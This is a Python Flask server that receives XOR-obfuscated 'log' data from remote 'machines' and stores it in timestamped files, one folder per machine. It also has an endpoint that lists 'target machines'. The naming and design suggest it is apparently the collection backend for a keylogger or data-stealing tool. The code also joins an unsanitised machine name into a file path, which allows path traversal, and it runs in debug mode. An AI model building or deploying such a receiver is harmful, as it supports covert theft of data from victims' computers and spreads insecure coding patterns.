import os
import time
from flask import Flask, request, jsonify
import Encryptor as enc

app = Flask(__name__)
DATA_FOLDER = "data"

def generate_log_filename():
    """Returns a filename based on the current timestamp"""
    return "log_" + time.strftime("%Y-%m-%d_%H-%M") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = enc.Encryptor.xor_encryption_and_decryption(data["data"],'k')

    # Create directory for the machine if it doesn't exist
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    # Generate a new filename based on the timestamp
    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    # Additional processing can be added here, such as adding another timestamp inside the file
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200
@app.route('/api/machines', methods=['GET'])
def get_targget_machines_list():
    """Returns a list of all machines that have logged data"""
    machines = os.listdir(DATA_FOLDER)
    return jsonify({"machines": machines})


if __name__ == "__main__":
    app.run(debug=True)